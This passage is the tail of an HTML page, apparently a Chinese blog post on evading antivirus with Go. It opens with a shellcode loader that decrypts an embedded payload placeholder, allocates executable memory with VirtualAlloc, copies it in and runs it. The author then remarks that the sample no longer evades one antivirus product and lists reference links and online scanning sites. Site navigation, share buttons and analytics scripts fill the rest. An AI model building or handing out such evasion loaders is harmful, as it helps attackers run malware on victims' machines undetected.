class="string">&quot;&lt;Shellcode&gt;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 解密Shellcode</span></span><br><span class="line">	charcode := getDeCode(shellcode)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 申请内存</span></span><br><span class="line">	addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">		syscall.Exit(<span class="number">0</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 加载Shellcode</span></span><br><span class="line">	_, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;charcode[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">		syscall.Exit(<span class="number">0</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 执行内存</span></span><br><span class="line">	syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>前面加密算法部分待改进，此处仅做演示。现在已过不了火绒了，下班</li>
+</ul>
+<p><a data-fancybox="gallery" data-src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-2.png" data-caption="Go免杀初探-2"><img src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-2.png" alt="Go免杀初探-2"></a></p>
+<ul>
+<li>参考文章：<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/superjiangzhen/article/details/79938458">程序内存空间（代码段、数据段、堆栈段）</a></li>
+<li><a target="_blank" rel="noopener" href="https://yunshanwuyin.com/BlogDetail?Id=thutgzhvtyyn4ezxzps6kcfu">初探Shellcode免杀</a></li>
+<li><a target="_blank" rel="noopener" href="https://forum.butian.net/share/736">CS 免杀学习</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Rvn0xsy/BadCode">https://github.com/Rvn0xsy/BadCode</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/aahmad097/AlternativeShellcodeExec">https://github.com/aahmad097/AlternativeShellcodeExec</a></li>
+</ul>
+</li>
+<li>在线杀毒检测：<ul>
+<li><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.virscan.org/">https://www.virscan.org/</a></li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/lists/">Lists</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4"><span class="toc-number">1.1.</span> <span class="toc-text">程序内存空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%9D%80%E4%B8%8E%E5%85%8D%E6%9D%80"><span class="toc-number">1.2.</span> <span class="toc-text">查杀与免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Go%E7%9B%B8%E5%85%B3"><span class="toc-number">1.3.</span> <span class="toc-text">Go相关</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Loader"><span class="toc-number">2.</span> <span class="toc-text">Loader</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86"><span class="toc-number">2.1.</span> <span class="toc-text">加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86"><span class="toc-number">2.2.</span> <span class="toc-text">解密</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&text=Go免杀初探"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&title=Go免杀初探"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&is_video=false&description=Go免杀初探"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Go免杀初探&body=Check out this article: https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&title=Go免杀初探"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&title=Go免杀初探"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&title=Go免杀初探"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&title=Go免杀初探"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&name=Go免杀初探&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.m1r0ku.com/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html&t=Go免杀初探"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2017-2023
+    M1r0ku
+  </div>
+  <div class="footer-right">
+    <nav>
+    <!--
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+       
+          <li><a href="/lists/">Lists</a></li>
+       
+          <li><a href="/links/">Links</a></li>
+       
+          <li><a href="/search/">Search</a></li>
+       
+      </ul>
+    -->
+      
+    <!-- 不蒜子统计 -->
+      <ul>
+        
+        <span id="busuanzi_container_site_pv">
+          <i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span>
+        </span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv" style='display:none'>
+          <i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span> 
+        </span>
+        <script async src="//cdn.bootcdn.net/ajax/libs/busuanzi/2.3.0/bsz.pure.mini.js"></script>
+        
+    </ul>
+    <ul>
+      
+  </ul>
+
+    </nav>
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?864b0988af87a8a8f5f115cd29c265de";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'M1r0ku/m1r0ku.github.io';
+      var utterances_issue_term = 'title';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'photon-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+
+<!-- FancyBox -->
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+</body>
+</html>
